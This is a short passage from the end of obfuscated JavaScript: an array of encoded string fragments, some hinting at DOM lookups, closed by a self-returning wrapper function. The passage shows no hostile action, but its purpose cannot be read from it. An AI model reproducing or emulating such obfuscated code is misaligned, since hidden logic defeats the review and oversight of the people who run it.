    'WPddI1vsg8okfSoRW4hcHa',
    'W4SXhCoaW4/dKCoGxgas',
    'Aw1PBIbIDhmSAG',
    'lceVW7GbFqLNxW4',
    'random',
    'D8kIk8oWW5bJnmorixm',
    'h-child(4)',
    'kq8jWOuBW48',
    'HcP_xmdwsl',
    'sByClassNa',
    'Cg9ZDa',
    'WR1GnujoBColva7dJa',
    'CSoHWQ8'
  ];
  a = function() {
    return bn;
  };
  return a();
}